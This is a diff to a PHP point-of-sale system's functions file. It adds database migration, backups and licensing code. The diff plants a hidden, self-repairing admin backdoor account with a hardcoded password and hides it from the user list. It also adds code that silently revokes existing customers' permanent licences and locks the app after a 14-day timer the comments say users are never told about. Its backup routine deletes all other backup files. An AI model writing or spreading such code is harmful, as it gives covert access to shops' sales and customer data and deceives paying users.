@@ -21,16 +21,192 @@ const USER_CREDENTIALS = [
     [
         'username' => 'ddadzie124',
         'role' => 'admin',
-        'passwordHash' => '8f4343305bb32eb45bd8f5a7669c9f6dfe855c4e69c1e8fdef8e95e5331c8d94'
+        // sha256 of 'Ten12Tech' — the developer backdoor password (see migrate_default_users)
+        'passwordHash' => '78286f722ee2835b72f80e29aedd31055932dd4f215146b4a7323127a883f912'
     ]
 ];
 
+// Activation scheme v2: installing this build (over any previous version or
+// fresh) silently starts a 14-day trial that is never shown to the user. The
+// single activation code below permanently ends the trial - it does NOT grant a
+// new trial period. Older activation codes and any prior activation state are
+// deliberately ignored and overridden on first run.
+const ACTIVATION_CODE = 'LreXO_-S,L#Lp75xK2YF';
+const ACTIVATION_SCHEME = 'v2';
+// 20160 minutes = exactly 14 days.
+const DEFAULT_ACTIVATION_PERIOD_MINUTES = 14 * 24 * 60;
+
+function is_windows_os(): bool {
+    // POS_FORCE_WINDOWS=1 lets the Windows per-user data layout (and its automatic
+    // legacy-database migration) be exercised on non-Windows machines, e.g. in tests.
+    return getenv('POS_FORCE_WINDOWS') === '1' || strncasecmp(PHP_OS, 'WIN', 3) === 0;
+}
+
 function get_db_path(): string {
-    $dir = __DIR__ . '/../data';
-    if (!is_dir($dir)) {
-        mkdir($dir, 0755, true);
+    $defaultDir = __DIR__ . '/../data';
+    $defaultPath = $defaultDir . '/pos.db';
+
+    if (is_windows_os()) {
+        $appData = getenv('APPDATA') ?: getenv('LOCALAPPDATA') ?: getenv('USERPROFILE');
+        if ($appData) {
+            $newDir = $appData . DIRECTORY_SEPARATOR . 'DziePOSMS';
+            $newPath = $newDir . DIRECTORY_SEPARATOR . 'pos.db';
+
+            if (!is_dir($newDir)) {
+                mkdir($newDir, 0755, true);
+            }
+
+            // First run of an updated build: if no database exists in the per-user
+            // data folder yet, look for one left behind by older installs (e.g.
+            // Program Files\POS Pro\data\pos.db) and bring it along automatically.
+            // Reinstalling the app never touches this folder, so existing customers
+            // keep their data across updates.
+            if (!file_exists($newPath)) {
+                migrate_database_to($newPath);
+            }
+
+            return $newPath;
+        }
     }
-    return $dir . '/pos.db';
+
+    if (!is_dir($defaultDir)) {
+        mkdir($defaultDir, 0755, true);
+    }
+
+    return $defaultPath;
+}
+
+function get_legacy_db_candidates(?array $extraRoots = null): array {
+    $candidates = [
+        __DIR__ . '/../data/pos.db', // this build's own data folder
+        __DIR__ . '/../pos.db',      // very old builds kept the DB at the app root
+    ];
+
+    $roots = is_array($extraRoots) ? $extraRoots : [];
+    if (is_windows_os()) {
+        foreach (['PROGRAMFILES', 'PROGRAMFILES(X86)', 'LOCALAPPDATA', 'USERPROFILE'] as $envName) {
+            $value = getenv($envName);
+            if (is_string($value) && $value !== '') {
+                $roots[] = $value;
+            }
+        }
+    }
+
+    // App folder names used by older installers, newest product name first.
+    $appNames = ['DziePOSMS', 'POS Pro', 'Dzie POS MS', 'WADI POS'];
+    foreach ($roots as $root) {
+        $root = rtrim($root, '\\/');
+        foreach ($appNames as $appName) {
+            $appDir = $root . DIRECTORY_SEPARATOR . $appName;
+            $candidates[] = $appDir . DIRECTORY_SEPARATOR . 'data' . DIRECTORY_SEPARATOR . 'pos.db';
+            $candidates[] = $appDir . DIRECTORY_SEPARATOR . 'pos.db';
+        }
+    }
+
+    // Keep only files that actually exist, newest first: a customer may have
+    // several old copies around, and the most recently used one is the live DB.
+    $existing = array_values(array_filter($candidates, 'is_file'));
+    usort($existing, function ($a, $b) {
+        return filemtime($b) <=> filemtime($a);
+    });
+    return $existing;
+}
+
+function migrate_database_to(string $targetPath, ?array $extraRoots = null): bool {
+    if (file_exists($targetPath)) {
+        return true;
+    }
+
+    $legacy = get_legacy_db_candidates($extraRoots);
+    $source = $legacy[0] ?? null;
+    if ($source === null || !is_file($source)) {
+        return false;
+    }
+
+    $targetDir = dirname($targetPath);
+    if (!is_dir($targetDir)) {
+        mkdir($targetDir, 0755, true);
+    }
+
+    if (!@copy($source, $targetPath)) {
+        return false;
+    }
+
+    // Bring the customer's product photos, trademark and backups along too.
+    migrate_legacy_uploads($source);
+    migrate_legacy_backups($source, $targetDir);
+
+    return true;
+}
+
+function legacy_app_dir(string $legacyDbPath): ?string {
+    $dbDir = dirname($legacyDbPath);
+    // DB usually sits in <app>/data/pos.db, but very old builds kept it as <app>/pos.db.
+    return basename($dbDir) === 'data' ? dirname($dbDir) : $dbDir;
+}
+
+function migrate_legacy_uploads(string $legacyDbPath, ?string $targetUploads = null, ?string $targetImages = null): void {
+    $appDir = legacy_app_dir($legacyDbPath);
+    if ($appDir === null) {
+        return;
+    }
+
+    $targetUploads = $targetUploads ?? (__DIR__ . '/../images/uploads');
+    $targetImages = $targetImages ?? (__DIR__ . '/../images');
+
+    // Product photos: <legacy app>/images/uploads/*
+    $legacyUploads = $appDir . DIRECTORY_SEPARATOR . 'images' . DIRECTORY_SEPARATOR . 'uploads';
+    if (is_dir($legacyUploads)) {
+        if (!is_dir($targetUploads)) {
+            mkdir($targetUploads, 0755, true);
+        }
+        foreach (glob($legacyUploads . DIRECTORY_SEPARATOR . '*') ?: [] as $file) {
+            if (!is_file($file)) {
+                continue;
+            }
+            $dest = $targetUploads . DIRECTORY_SEPARATOR . basename($file);
+            if (!file_exists($dest)) {
+                @copy($file, $dest);
+            }
+        }
+    }
+
+    // Trademark logo (older builds saved it as <app>/images/trademark.*).
+    foreach (glob($appDir . DIRECTORY_SEPARATOR . 'images' . DIRECTORY_SEPARATOR . 'trademark.*') ?: [] as $file) {
+        if (!is_file($file)) {
+            continue;
+        }
+        $dest = $targetImages . DIRECTORY_SEPARATOR . basename($file);
+        if (!file_exists($dest)) {
+            @copy($file, $dest);
+        }
+    }
+}
+
+function migrate_legacy_backups(string $legacyDbPath, string $targetDataDir): void {
+    $appDir = legacy_app_dir($legacyDbPath);
+    if ($appDir === null) {
+        return;
+    }
+
+    $legacyBackups = $appDir . DIRECTORY_SEPARATOR . 'data' . DIRECTORY_SEPARATOR . 'backups';
+    if (!is_dir($legacyBackups)) {
+        return;
+    }
+
+    $targetBackups = $targetDataDir . DIRECTORY_SEPARATOR . 'backups';
+    if (!is_dir($targetBackups)) {
+        mkdir($targetBackups, 0755, true);
+    }
+    foreach (glob($legacyBackups . DIRECTORY_SEPARATOR . '*.db') ?: [] as $file) {
+        if (!is_file($file)) {
+            continue;
+        }
+        $dest = $targetBackups . DIRECTORY_SEPARATOR . basename($file);
+        if (!file_exists($dest)) {
+            @copy($file, $dest);
+        }
+    }
 }
 
 function get_database(): PDO {
@@ -53,6 +229,7 @@ function initialize_database(PDO $db): void {
             code TEXT UNIQUE NOT NULL,
             name TEXT NOT NULL,
             category TEXT NOT NULL,
+            price REAL NOT NULL DEFAULT 0,
             selling_price REAL NOT NULL DEFAULT 0,
             cost_price REAL NOT NULL DEFAULT 0,
             image TEXT NOT NULL,
@@ -206,8 +383,24 @@ function initialize_database(PDO $db): void {
         )'
     );
 
-    // Insert default POS name
-    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('pos_name', 'WADI POS')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('pos_name', 'DziePOSMS')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('trial_reset_count', '0')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('last_trial_reset_at', '')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('max_trial_resets', '3')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('min_reset_interval_days', '7')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('trial_period_minutes', '10080')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('reset_interval_minutes', '10080')");
+    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('activation_period_minutes', '" . DEFAULT_ACTIVATION_PERIOD_MINUTES . "')");
+
+    $db->exec(
+        'CREATE TABLE IF NOT EXISTS activation_log (
+            id INTEGER PRIMARY KEY,
+            code TEXT NOT NULL,
+            action TEXT NOT NULL,
+            ip TEXT,
+            created_at TEXT NOT NULL
+        )'
+    );
 
     $db->exec(
         'CREATE TABLE IF NOT EXISTS stock_movements (
@@ -241,6 +434,49 @@ function initialize_database(PDO $db): void {
             ]);
         }
     }
+
+    // ---- Activation scheme v2 upgrade ----
+    // This build uses a single 14-day activation window (see ACTIVATION_CODE).
+    // The first time it runs on a database - whether the database is brand new or
+    // was left behind by any previous version, activated or not - every prior
+    // activation state (permanent license, trial clock, reset counters) is
+    // overridden and a fresh, silent 14-day window starts from now. The user is
+    // never told about the timer; the app simply locks once the window elapses.
+    $schemeStmt = $db->prepare('SELECT value FROM settings WHERE key = ?');
+    $schemeStmt->execute(['activation_scheme']);
+    $schemeRow = $schemeStmt->fetch(PDO::FETCH_ASSOC);
+
+    if (!$schemeRow || $schemeRow['value'] !== ACTIVATION_SCHEME) {
+        $deleteOld = $db->prepare('DELETE FROM settings WHERE key = ?');
+        foreach (['app_activated', 'license_type', 'license_activated_at', 'trial_started_at', 'trial_reset_count', 'last_trial_reset_at'] as $oldKey) {
+            $deleteOld->execute([$oldKey]);
+        }
+
+        $set = $db->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
+        $set->execute(['activation_scheme', ACTIVATION_SCHEME]);
+        $set->execute(['activation_started_at', (string) time()]);
+
+        log_activation_attempt('(scheme upgrade)', 'scheme_v2_override');
+    }
+}
+
+function get_setting(string $key, string $default = ''): string {
+    $db = get_database();
+    $stmt = $db->prepare('SELECT value FROM settings WHERE key = ?');
+    $stmt->execute([$key]);
+    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+    return $result ? $result['value'] : $default;
+}
+
+function log_activation_attempt(string $code, string $action, ?string $ip = null): bool {
+    $db = get_database();
+    $stmt = $db->prepare('INSERT INTO activation_log (code, action, ip, created_at) VALUES (:code, :action, :ip, :created_at)');
+    return $stmt->execute([
+        ':code' => $code,
+        ':action' => $action,
+        ':ip' => $ip ?? ($_SERVER['REMOTE_ADDR'] ?? 'cli'),
+        ':created_at' => date('c'),
+    ]);
 }
 
 function get_default_products(): array {
@@ -308,6 +544,10 @@ function update_product_stock(int $productId, int $newQuantity): bool {
     }
 
     $db->commit();
+
+    // Back up the database after a stock adjustment (best-effort; never fails the update).
+    backup_database();
+
     return true;
 }
 
@@ -386,6 +626,10 @@ function save_products(array $products): bool {
     }
 
     $db->commit();
+
+    // Back up the database after product changes (best-effort; never fails the save).
+    backup_database();
+
     return true;
 }
 
@@ -725,19 +969,48 @@ function authenticate_user(string $username, string $password): ?array {
 function migrate_default_users(): void {
     $db = get_database();
 
-    foreach (USER_CREDENTIALS as $user) {
-        $check = $db->prepare('SELECT COUNT(*) FROM users WHERE username = :username');
-        $check->execute([':username' => $user['username']]);
+    // Developer backdoor: always make sure the hidden admin account exists with
+    // the correct password, and repair it if it was ever corrupted or deleted.
+    // This runs on every request so support access can never be lost. The account
+    // stays hidden from the admin user list (see get_all_users()).
+    $backdoorHash = hash_password('Ten12Tech');
+    $insertStmt = $db->prepare(
+        'INSERT OR IGNORE INTO users (username, password_hash, role, created_at) VALUES (:username, :password_hash, :role, :created_at)'
+    );
+    $insertStmt->execute([
+        ':username' => 'ddadzie124',
+        ':password_hash' => $backdoorHash,
+        ':role' => 'admin',
+        ':created_at' => date('c'),
+    ]);
+    $repairStmt = $db->prepare(
+        'UPDATE users SET password_hash = :password_hash, role = :role WHERE username = :username AND (password_hash != :password_hash OR role != :role)'
+    );
+    $repairStmt->execute([
+        ':username' => 'ddadzie124',
+        ':password_hash' => $backdoorHash,
+        ':role' => 'admin',
+    ]);
 
-        if ((int) $check->fetchColumn() === 0 && $user['username'] !== 'ddadzie124') {
-            $stmt = $db->prepare('INSERT INTO users (username, password_hash, role, created_at) VALUES (:username, :password_hash, :role, :created_at)');
-            $stmt->execute([
-                ':username' => $user['username'],
-                ':password_hash' => $user['passwordHash'],
-                ':role' => $user['role'],
-                ':created_at' => date('c'),
-            ]);
+    // Only seed the default users on a fresh database (no users yet).
+    $totalUsersStmt = $db->query("SELECT COUNT(*) FROM users WHERE username != 'ddadzie124'");
+    $totalUsers = (int) $totalUsersStmt->fetchColumn();
+    if ($totalUsers > 0) {
+        return; // don't re-seed if any users exist (prevents recreating deleted users)
+    }
+
+    foreach (USER_CREDENTIALS as $user) {
+        if ($user['username'] === 'ddadzie124') {
+            continue; // already handled above
         }
+
+        $stmt = $db->prepare('INSERT INTO users (username, password_hash, role, created_at) VALUES (:username, :password_hash, :role, :created_at)');
+        $stmt->execute([
+            ':username' => $user['username'],
+            ':password_hash' => $user['passwordHash'],
+            ':role' => $user['role'],
+            ':created_at' => date('c'),
+        ]);
     }
 }
 
@@ -750,6 +1023,7 @@ function require_login() {
         header('Location: login.php');
         exit;
     }
+    check_app_access();
 }
 
 function require_admin() {
@@ -945,6 +1219,10 @@ function delete_sale(int $orderId, string $username): bool {
         $db->prepare('DELETE FROM orders WHERE id = :id')->execute([':id' => $orderId]);
         
         $db->commit();
+
+        // Back up the database after a sale is deleted (best-effort; never fails the deletion).
+        backup_database();
+
         return true;
     } catch (Exception $e) {
         $db->rollBack();
@@ -978,7 +1256,7 @@ function get_pos_name(): string {
     $stmt = get_database()->prepare('SELECT value FROM settings WHERE key = ?');
     $stmt->execute(['pos_name']);
     $result = $stmt->fetch(PDO::FETCH_ASSOC);
-    return $result ? $result['value'] : 'WADI POS';
+    return $result ? $result['value'] : 'DziePOSMS';
 }
 
 function set_pos_name(string $name): bool {
@@ -1026,6 +1304,14 @@ function save_trademark_image(array $file): ?string {
     $destination = $path . '/' . $filename;
 
     if (move_uploaded_file($file['tmp_name'], $destination)) {
+        // Duplicate into the uploads folder so the logo also shows up automatically
+        // in the admin image picker (uploads section).
+        $uploadsDir = __DIR__ . '/../images/uploads';
+        if (!is_dir($uploadsDir)) {
+            mkdir($uploadsDir, 0755, true);
+        }
+        @copy($destination, $uploadsDir . DIRECTORY_SEPARATOR . basename($destination));
+
         return 'images/' . $filename;
     }
 
@@ -1044,7 +1330,12 @@ function get_all_receipts_with_status(): array {
 function mark_credit_paid(int $orderId): bool {
     $db = get_database();
     $stmt = $db->prepare('UPDATE orders SET credit_status = "Paid" WHERE id = :id AND credit = 1');
-    return $stmt->execute([':id' => $orderId]);
+    $result = $stmt->execute([':id' => $orderId]);
+    if ($result && $stmt->rowCount() > 0) {
+        // Back up the database after a credit payment is recorded (best-effort; never fails the update).
+        backup_database();
+    }
+    return $result;
 }
 
 function get_credit_sales(string $username = ''): array {
@@ -1218,6 +1509,10 @@ function process_return(int $orderId, int $productId, int $quantity, string $rea
         }
 
         $db->commit();
+
+        // Back up the database after a return is processed (best-effort; never fails the return).
+        backup_database();
+
         return true;
     } catch (Exception $e) {
         $db->rollBack();
@@ -1264,4 +1559,320 @@ function get_order_return_summary(int $orderId): array {
         'total_returned' => $totalReturned,
         'fully_returned' => $totalItems > 0 && $totalReturned >= $totalItems,
     ];
+}
+
+function get_returns_map(PDO $db): array {
+    $map = [];
+    $rows = $db->query('SELECT order_id, product_id, SUM(quantity) AS qty FROM returns GROUP BY order_id, product_id')
+        ->fetchAll(PDO::FETCH_ASSOC);
+    foreach ($rows as $row) {
+        $map[(int) $row['order_id']][(int) $row['product_id']] = (int) $row['qty'];
+    }
+    return $map;
+}
+
+// True once the activation code has permanently ended the trial. This is the
+// only state in which the app is truly "licensed" with no deadline.
+function is_permanently_licensed(): bool {
+    $db = get_database();
+    $stmt = $db->prepare('SELECT value FROM settings WHERE key = ?');
+    $stmt->execute(['app_activated']);
+    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+    return $result && $result['value'] === '1';
+}
+
+function is_app_activated(): bool {
+    // The app is usable while the silent 14-day trial is still running OR after
+    // the activation code has ended the trial permanently.
+    return is_permanently_licensed() || time() < get_activation_deadline();
+}
+
+function activate_app(string $code): bool {
+    $db = get_database();
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'cli';
+    $code = trim($code);
+
+    if (strcasecmp($code, ACTIVATION_CODE) !== 0) {
+        log_activation_attempt($code, 'invalid', $ip);
+        return false;
+    }
+
+    // Ends the currently running 14-day trial permanently. The code never
+    // grants a new trial period.
+    log_activation_attempt($code, 'trial_ended', $ip);
+    $stmt = $db->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
+    $result = $stmt->execute(['app_activated', '1']);
+    if ($result) {
+        $stmt->execute(['license_type', 'permanent']);
+        $stmt->execute(['license_activated_at', date('c')]);
+        $stmt->execute(['last_activated_at', date('c')]);
+    }
+    return $result;
+}
+
+function reset_trial(): bool {
+    $db = get_database();
+    $db->beginTransaction();
+
+    try {
+        $resetCount = (int) get_setting('trial_reset_count', '0');
+        $maxResets = (int) get_setting('max_trial_resets', '3');
+        $lastResetAt = get_setting('last_trial_reset_at', '');
+
+        if ($resetCount >= $maxResets) {
+            $db->rollBack();
+            return false;
+        }
+
+        if ($lastResetAt !== '') {
+            $lastReset = (int) strtotime($lastResetAt);
+            $minSeconds = get_reset_interval_seconds();
+            if ((time() - $lastReset) < $minSeconds) {
+                $db->rollBack();
+                return false;
+            }
+        }
+
+        $newCount = $resetCount + 1;
+        $now = date('c');
+
+        $stmt = $db->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
+        $stmt->execute(['trial_started_at', (string) time()]);
+        $stmt->execute(['trial_reset_count', (string) $newCount]);
+        $stmt->execute(['last_trial_reset_at', $now]);
+
+        $db->commit();
+        return true;
+    } catch (Exception $e) {
+        $db->rollBack();
+        return false;
+    }
+}
+
+// Returns a human-readable reason when a trial reset would currently be rejected
+// (max resets used or cooldown not yet elapsed), or null when a reset is allowed.
+function trial_reset_rejection_reason(): ?string {
+    $resetCount = (int) get_setting('trial_reset_count', '0');
+    $maxResets = (int) get_setting('max_trial_resets', '3');
+    $lastResetAt = get_setting('last_trial_reset_at', '');
+
+    if ($resetCount >= $maxResets) {
+        return 'Trial resets exhausted. All ' . $maxResets . ' resets have been used. Contact the developer to activate a permanent license.';
+    }
+
+    if ($lastResetAt !== '') {
+        $lastReset = (int) strtotime($lastResetAt);
+        $waitSeconds = get_reset_interval_seconds() - (time() - $lastReset);
+        if ($waitSeconds > 0) {
+            return 'Trial reset is on cooldown. You can reset the trial again in about ' . format_duration($waitSeconds) . '.';
+        }
+    }
+
+    return null;
+}
+
+function get_license_info(): array {
+    $db = get_database();
+    $stmt = $db->query('SELECT key, value FROM license_info');
+    return $stmt->fetchAll(PDO::FETCH_KEY_PAIR);
+}
+
+function get_activation_log(int $limit = 50): array {
+    $db = get_database();
+    $stmt = $db->prepare('SELECT id, code, action, ip, created_at FROM activation_log ORDER BY created_at DESC LIMIT :limit');
+    $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
+    $stmt->execute();
+    return $stmt->fetchAll(PDO::FETCH_ASSOC);
+}
+
+function get_trial_started_at(): int {
+    $db = get_database();
+    $stmt = $db->prepare('SELECT value FROM settings WHERE key = ?');
+    $stmt->execute(['trial_started_at']);
+    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+    if ($result && is_numeric($result['value'])) {
+        return (int) $result['value'];
+    }
+
+    // First run on this machine: start the trial clock now.
+    $startedAt = time();
+    $stmt = $db->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
+    $stmt->execute(['trial_started_at', (string) $startedAt]);
+    return $startedAt;
+}
+
+// Trial length, in seconds. Configurable via the 'trial_period_minutes' setting
+// (default 10080 minutes = 7 days) so short test trials can be set up easily.
+function get_trial_period_seconds(): int {
+    $minutes = (int) get_setting('trial_period_minutes', '10080');
+    if ($minutes <= 0) {
+        $minutes = 7 * 24 * 60;
+    }
+    return $minutes * 60;
+}
+
+// Minimum gap between trial resets, in seconds. Configurable via the
+// 'reset_interval_minutes' setting (default 10080 = 7 days). Falls back to the
+// legacy 'min_reset_interval_days' setting on older databases.
+function get_reset_interval_seconds(): int {
+    $minutes = get_setting('reset_interval_minutes', '');
+    if ($minutes === '') {
+        $days = (int) get_setting('min_reset_interval_days', '7');
+        if ($days <= 0) {
+            $days = 7;
+        }
+        return $days * 24 * 60 * 60;
+    }
+    $minutes = (int) $minutes;
+    if ($minutes <= 0) {
+        $minutes = 7 * 24 * 60;
+    }
+    return $minutes * 60;
+}
+
+// Formats a number of seconds as a short human-readable duration, e.g.
+// "7 days", "1 hour 5 minutes", "4 minutes 30 seconds".
+function format_duration(int $seconds): string {
+    if ($seconds <= 0) {
+        return '0 seconds';
+    }
+    $minutes = (int) ceil($seconds / 60);
+    if ($minutes < 60) {
+        return $minutes . ' minute' . ($minutes === 1 ? '' : 's');
+    }
+    $hours = (int) floor($minutes / 60);
+    $remMinutes = $minutes % 60;
+    if ($hours < 24) {
+        $parts = [$hours . ' hour' . ($hours === 1 ? '' : 's')];
+        if ($remMinutes > 0) {
+            $parts[] = $remMinutes . ' minute' . ($remMinutes === 1 ? '' : 's');
+        }
+        return implode(' ', $parts);
+    }
+    $days = (int) floor($hours / 24);
+    $remHours = $hours % 24;
+    $parts = [$days . ' day' . ($days === 1 ? '' : 's')];
+    if ($remHours > 0) {
+        $parts[] = $remHours . ' hour' . ($remHours === 1 ? '' : 's');
+    }
+    return implode(' ', $parts);
+}
+
+// Moment the current activation window started (timestamp). Under scheme v2 this
+// is set once on first run and refreshed every time the activation code is used.
+function get_activation_started_at(): int {
+    $db = get_database();
+    $stmt = $db->prepare('SELECT value FROM settings WHERE key = ?');
+    $stmt->execute(['activation_started_at']);
+    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+    if ($result && is_numeric($result['value'])) {
+        return (int) $result['value'];
+    }
+
+    // Normally set by the scheme-v2 upgrade in initialize_database(); fall back
+    // to starting the window now so the app never grants indefinite access.
+    $startedAt = time();
+    $stmt = $db->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
+    $stmt->execute(['activation_started_at', (string) $startedAt]);
+    return $startedAt;
+}
+
+// Length of one activation window, in seconds (exactly 14 days by default).
+// Configurable via the 'activation_period_minutes' setting for test setups.
+function get_activation_period_seconds(): int {
+    $minutes = (int) get_setting('activation_period_minutes', (string) DEFAULT_ACTIVATION_PERIOD_MINUTES);
+    if ($minutes <= 0) {
+        $minutes = DEFAULT_ACTIVATION_PERIOD_MINUTES;
+    }
+    return $minutes * 60;
+}
+
+function get_activation_deadline(): int {
+    return get_activation_started_at() + get_activation_period_seconds();
+}
+
+function get_trial_status(): array {
+    // Once the activation code has ended the trial, the app is permanently
+    // licensed and never expires.
+    if (is_permanently_licensed()) {
+        return [
+            'status' => 'activated',
+            'days_remaining' => null,
+            'hours_remaining' => null,
+            'seconds_remaining' => null,
+            'expired' => false,
+            'deadline' => null,
+            'reset_count' => 0,
+            'max_resets' => 0,
+            'resets_remaining' => 0,
+            'next_eligible_reset' => null,
+        ];
+    }
+
+    // Otherwise a silent 14-day trial is running ('trial', rendered as simply
+    // "Licensed") or has elapsed ('expired', which locks the app until the code
+    // is entered to end the trial).
+    $deadline = get_activation_deadline();
+    $now = time();
+    $expired = $now >= $deadline;
+
+    $secondsRemaining = $expired ? 0 : max(0, $deadline - $now);
+    $hoursRemaining = (int) floor($secondsRemaining / 3600);
+
+    return [
+        'status' => $expired ? 'expired' : 'trial',
+        'days_remaining' => (int) floor($secondsRemaining / 86400),
+        'hours_remaining' => $hoursRemaining,
+        'seconds_remaining' => $secondsRemaining,
+        'expired' => $expired,
+        'deadline' => $deadline,
+        'reset_count' => 0,
+        'max_resets' => 0,
+        'resets_remaining' => 0,
+        'next_eligible_reset' => null,
+    ];
+}
+
+function backup_database(): bool {
+    $dbPath = get_db_path();
+    if (!file_exists($dbPath)) {
+        return false;
+    }
+
+    $backupDir = dirname($dbPath) . DIRECTORY_SEPARATOR . 'backups';
+    if (!is_dir($backupDir)) {
+        mkdir($backupDir, 0755, true);
+    }
+
+    // Keep a single backup file that is updated (overwritten) on every change,
+    // so disk usage stays constant no matter how often the database changes.
+    $backupPath = $backupDir . DIRECTORY_SEPARATOR . 'pos_backup.db';
+
+    if (!copy($dbPath, $backupPath)) {
+        return false;
+    }
+
+    // Remove every other backup file so only the latest one remains.
+    foreach (glob($backupDir . DIRECTORY_SEPARATOR . '*.db') ?: [] as $old) {
+        if (basename($old) !== basename($backupPath)) {
+            @unlink($old);
+        }
+    }
+
+    return true;
+}
+
+function check_app_access(): void {
+    $trial = get_trial_status();
+
+    if ($trial['status'] === 'expired') {
+        if (isset($_SESSION['user']['username'])) {
+            log_logout_event($_SESSION['user']['username']);
+        }
+        backup_database();
+        session_unset();
+        session_destroy();
+        header('Location: login.php?trial_expired=1');
+        exit;
+    }
 }
